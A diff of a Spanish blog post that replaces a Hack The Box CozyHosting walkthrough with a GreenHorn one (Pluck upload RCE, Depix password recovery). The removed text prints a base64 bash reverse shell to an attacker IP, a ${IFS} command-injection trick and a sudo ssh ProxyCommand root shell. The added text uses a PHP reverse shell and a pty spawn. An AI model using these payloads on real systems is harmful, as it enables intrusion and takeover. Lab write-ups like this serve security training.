@@ -1,11 +1,11 @@
 ---
 layout: single
 title: GreenHorn - Machines - Hack The Box
-excerpt: "cozyhosting es una máquina de nivel facil, con sistema operativo Linux que tiene una vulnerabilidad en una aplicación web que lleva a la toma total del control del sistema."
-date: 2023-12-22
+excerpt: "greenhorn es una máquina de nivel facil, con sistema operativo Linux que tiene una vulnerabilidad de shell remoto en una aplicación web Pluck que lleva a la toma total del control del sistema."
+date: 2024-08-14
 classes: wide
 header:
-  teaser: /assets/images/htb-machines-cozyhosting/cozyhosting1.png
+  teaser: /assets/images/htb-machines-greenhorn/greenhorn1.png
   teaser_home_page: true
   icon: /assets/images/hackthebox.webp
 categories:
@@ -13,138 +13,162 @@ categories:
   - machines
  
 tags:  
-  - BurpSuite
-  - Password Cracking
-  - Steal Web Session Cookie
-  - cozyhosting
-  - Hashcat
-  - gtfobins
-    
+  - CrackStation
+  - Depix
+  - Pluck
+  - cve-2023-50564
+     
 ---
 
-![](/assets/images/htb-machines-cozyhosting/cozyhosting1.png)
+![](/assets/images/htb-machines-greenhorn/greenhorn1.png)
 
-cozyhosting es una máquina de nivel facil, con sistema operativo Linux que tiene una vulnerabilidad en una aplicación web que lleva a la toma total del control del sistema.
+greenhorn es una máquina de nivel facil, con sistema operativo Linux que tiene una vulnerabilidad de shell remoto en una aplicación web Pluck que lleva a la toma total del control del sistema.
 
 ## 1. Enumeración 
 
-Realizamos un escaneo de puertos con Nmap y evidenciamos dos puertos abiertos.
-
-•	SSH (22)
+Iniciamos con un NMAP para buscar puertos y servicios abiertos en el objetivo. Identificamos dos puertos abiertos (80 y 3000).
 
 •	HTTP (80)
 
-![](/assets/images/htb-machines-cozyhosting/cozyhosting2.png)
+•	HTTP (3000)
 
-Al ingresar al servicio por el puerto 80, nos redirige al dominio “cozyhosting.htb”.
+![](/assets/images/htb-machines-greenhorn/greenhorn2.png)
 
-![](/assets/images/htb-machines-cozyhosting/cozyhosting3.png)
+Al ingresar al servicio por el puerto 80, nos redirige al dominio “greenhorn.htb”.
+
+![](/assets/images/htb-machines-greenhorn/greenhorn3.png)
 
 Vamos a agregar este dominio a nuestro archivo "etc/hosts".
 
-![](/assets/images/htb-machines-cozyhosting/cozyhosting4.png)
+![](/assets/images/htb-machines-greenhorn/greenhorn4.png)
 
-Ahora navegamos al dominio y empezamos la revisión del sitio.
+Ahora intentamos ver el sitio web, ya podemos visualizar el contenido. Ahora vamos a explorar el sitio. Vemos un menú admin.
 
-![](/assets/images/htb-machines-cozyhosting/cozyhosting5.png)
+![](/assets/images/htb-machines-greenhorn/greenhorn5.png)
 
 ## 2.	Acceso Inicial
 
-Realizamos la búsqueda de directorio con la herrmaineta “dirsearh” y encontramos el siguiente directorio.
+Luego de darle clic nos lleva a un sitio de login el cual está ejecutando Pluck en versión 4.7.18.
 
-•	/actuator/sessions.
+![](/assets/images/htb-machines-greenhorn/greenhorn6.png)
 
-![](/assets/images/htb-machines-cozyhosting/cozyhosting6.png)
+Realizando una búsqueda en internet, encontramos que Pluck 4.7.18 sufre una vulnerabilidad de shell remoto.
+•	https://packetstormsecurity.com/files/173640/Pluck-4.7.18-Remote-Shell-Upload.html?source=post_page-----e87e1cc07864--------------------------------
+Para poder explotar esta vulnerabilidad, primero necesitamos una contraseña. Vamos a explorar el servicio que se ejecuta en el puerto 3000.
 
-Al ingresar al directorio, observamos que contiene los JESSIONID de los usuarios autenticados.
+![](/assets/images/htb-machines-greenhorn/greenhorn7.png)
 
-![](/assets/images/htb-machines-cozyhosting/cozyhosting7.png)
+Encontramos que dentro de la ruta “/explore” tenemos un repositorio “GreenAdmin”.
 
-Procedemos a utilizar la Cookie de sesión para intentar autenticarnos en el sitio.
+![](/assets/images/htb-machines-greenhorn/greenhorn8.png)
 
-![](/assets/images/htb-machines-cozyhosting/cozyhosting8.png)
+Explorando un poco el repositorio, observamos un archivo “pass.php” el cual contiene un hash de una contraseña.
 
-Luego de iniciar sesión, observamos que existe una funcionalidad que permite una conexión SSH. Procedemos a ingresar la IP de nuestro equipo y un usuario cualquiera. 
+![](/assets/images/htb-machines-greenhorn/greenhorn9.png)
 
-![](/assets/images/htb-machines-cozyhosting/cozyhosting9.png)
+Intentamos romper el hash con el servicio en línea CkarckStation.
 
-Luego interceptamos la petición con BurpSuite.
+• https://crackstation.net/
 
-![](/assets/images/htb-machines-cozyhosting/cozyhosting10.png)
+![](/assets/images/htb-machines-greenhorn/greenhorn10.png)
 
-Creamos un reverse Shell y lo codificamos en base64.
+Ahora con la contraseña en texto claro, probamos en el menú de login.
 
-![](/assets/images/htb-machines-cozyhosting/cozyhosting11.png)
+![](/assets/images/htb-machines-greenhorn/greenhorn11.png)
 
-Ahora vamos a necesitar convertir la carga útil en un formato sin espacios, es decir reemplazar los espacios por ${IFS%??}. Para ello vamos a utilizar el siguiente servicio en línea.
+Ahora, nuestro objetivo es encontrar un lugar donde podamos explotar la vulnerabilidad. Observamos que para la vulnerabilidad de Pluck, debemos intentar instalar un módulo el cual nos permite cargar únicamente un archivo ZIP.
 
-•	https://www.urlencoder.org/es.
+![](/assets/images/htb-machines-greenhorn/greenhorn12.png)
 
-•	Carga útil: 	echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMjYvNzc3NyAwPiYxCg==" | base64 -d | bash.
+Ahora lo que necesitamos es crear un archivo ZIP que contenga un shell reverse.
 
-![](/assets/images/htb-machines-cozyhosting/cozyhosting12.png)
+![](/assets/images/htb-machines-greenhorn/greenhorn13.png)
 
-Nos ponemos a la escucha en nuestra maquina atacante por el mismo puerto que configuramos en nuestro reverse Shell. Ahora enviamos la petición desde BurpSuite y esperamos recibir la conexión.
+## 3.	Explotación
 
-![](/assets/images/htb-machines-cozyhosting/cozyhosting13.png)
+Vamos a utilizar el siguiente exploit que encontramos, el cual explota la vulnerabilidad de Pluck.
 
-Observamos un archivo con extensión “.jar”.
+• https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php?source=post_page-----e87e1cc07864--------------------------------
 
-![](/assets/images/htb-machines-cozyhosting/cozyhosting14.png)
+Creamos un archivo PHP copiando el exploit del link.
 
-Vamos a descargarlo e intentar leer el contenido. Iniciamos un servidor web en el equipo víctima.
+![](/assets/images/htb-machines-greenhorn/greenhorn14.png)
 
-![](/assets/images/htb-machines-cozyhosting/cozyhosting15.png)
+Modificamos el archivo, ingresando nuestra dirección IP (VPN) de la máquina virtual.
 
-Ahora descargamos el contenido del archivo.
+![](/assets/images/htb-machines-greenhorn/greenhorn15.png)
 
-![](/assets/images/htb-machines-cozyhosting/cozyhosting16.png)
+Como solo carga archivos .zip, vamos a cambiar el tipo de archivo.
 
-Para poder leer el contenido del archivo, vamos a necesitar instalar en nuestra maquina atacante “JD-GUI” desde la siguiente página.
+![](/assets/images/htb-machines-greenhorn/greenhorn16.png)
 
-•	https://java-decompiler.github.io.
+Adicionalmente vamos a poner nuestra maquina virtual a la escucha por el mismo puerto del exploit con Netcat para recibir la conexión.
 
-Luego de la instalacion, procedemos a leer el archivo descargado. Identificamos credenciales para la base de datos PostgresSQL.
+![](/assets/images/htb-machines-greenhorn/greenhorn17.png)
 
-![](/assets/images/htb-machines-cozyhosting/cozyhosting17.png)
+Intentamos cargar nuestro archivo exploit.
 
-Iniciamos sesión en el equipo víctima con estas credenciales, listamos el contenido de la tabla users y encontramos dos hashes.
+![](/assets/images/htb-machines-greenhorn/greenhorn18.png)
 
-![](/assets/images/htb-machines-cozyhosting/cozyhosting18.png)
+Cargamos la página en donde se almacenas los archivos cargados con el objetivo de que nuestro exploit se active.
 
-Guardamos esos hash en un archivo.
+![](/assets/images/htb-machines-greenhorn/greenhorn19.png)
 
-![](/assets/images/htb-machines-cozyhosting/cozyhosting19.png)
+Hemos recibido una Shell, pero tenemos acceso restringido.
 
-Ahora con la herramienta Hashcat vamos a intentar crackear el hash de admin.
+![](/assets/images/htb-machines-greenhorn/greenhorn20.png)
 
-![](/assets/images/htb-machines-cozyhosting/cozyhosting20.png)
+Vamos a cambiar por una Shell mas interactiva con el comando.
 
-Pudimos obtener la contraseña.
+• /usr/bin/python3 -c 'import pty; pty.spawn("/bin/bash")'
 
-![](/assets/images/htb-machines-cozyhosting/cozyhosting21.png)
+![](/assets/images/htb-machines-greenhorn/greenhorn21.png)
 
-Ahora listamos los usuarios de la maquina y observamos el usuario “Josh”. Vamos a utilizar la contraseña junto con el usuario Josh para intentar cambiar de sesión.
+Con la contraseña obtenida en los pasos anteriores intentamos autenticarnos con el usuario “junior” identificado para poder capturar nuestra primera bandera de usuario estándar.
 
-Ahora que estamos en la sesión del usuario Josh, vamos a obtener nuestra primera flag.
-
-![](/assets/images/htb-machines-cozyhosting/cozyhosting22.png)
-
-Nos vamos a conectar por ssh con las mismas credenciales solo para tener mejor control del equipo y una Shell más interactiva.
-
-![](/assets/images/htb-machines-cozyhosting/cozyhosting23.png)
-
+![](/assets/images/htb-machines-greenhorn/greenhorn22.png)
 
 ## 3. Escalada de privilegios
 
-Identificamos que comando puede ejecutar el usuario actual con permisos de root.
+Necesitamos escalar privilegios para poder llegar a la bandera del usuario “root”. Vamos a identificar archivos ocultos.
 
-Existe una carga útil en GTFOBINS que permite generar un shell interactivo a través de la opción ProxyCommand.
+![](/assets/images/htb-machines-greenhorn/greenhorn23.png)
 
-•	https://gtfobins.github.io/gtfobins/ssh/#sudo
+Encontramos un archivo PDF que vamos a transferir a nuestra máquina virtual para verlo con más detalles. Levantamos un servidor web.
 
-•	Carga útil: ssh -o ProxyCommand=';sh 0<&2 1>&2' x
+![](/assets/images/htb-machines-greenhorn/greenhorn24.png)
 
-Ahora solo nos queda obtener nuestra segunda flag.
+Desde nuestra maquina virtual vamos a transferirlo.
 
-![](/assets/images/htb-machines-cozyhosting/cozyhosting24.png)
+![](/assets/images/htb-machines-greenhorn/greenhorn25.png)
+
+Visualizamos el PDF en donde se encuentra una contraseña, pero pixelada.
+
+![](/assets/images/htb-machines-greenhorn/greenhorn26.png)
+
+Vamos a hacer uso de una herramienta para convertir el documento pixelado en una imagen.
+
+• https://tools.pdf24.org/en/extract-images?source=post_page-----e87e1cc07864--------------------------------#s=1723656608236
+
+![](/assets/images/htb-machines-greenhorn/greenhorn27.png)
+
+Ahora con el trozo de la imagen pixelada vamos a trabajar con la herramienta Depix para despixelar imágenes.
+
+• https://github.com/spipm/Depix?source=post_page-----e87e1cc07864--------------------------------
+Necesitamos clonar el repositorio e ingresamos a la carpeta descargada.
+
+![](/assets/images/htb-machines-greenhorn/greenhorn28.png)
+
+Luego vamos a ejecutar el comando que se especifica en el Git con el cual intentaremos despixelar la imagen, apuntando a la ruta de la imagen y en donde se guardaría la nueva imagen despixelada.
+
+![](/assets/images/htb-machines-greenhorn/greenhorn29.png)
+
+Finalizo la herramienta y nos genera la siguiente imagen, en ella identificamos el siguiente texto.
+
+• side------------------------------------------------side
+
+![](/assets/images/htb-machines-greenhorn/greenhorn30.png)
+
+Usamos la contraseña para autenticarnos como root y capturar nuestra segunda bandera.
+
+![](/assets/images/htb-machines-greenhorn/greenhorn31.png)
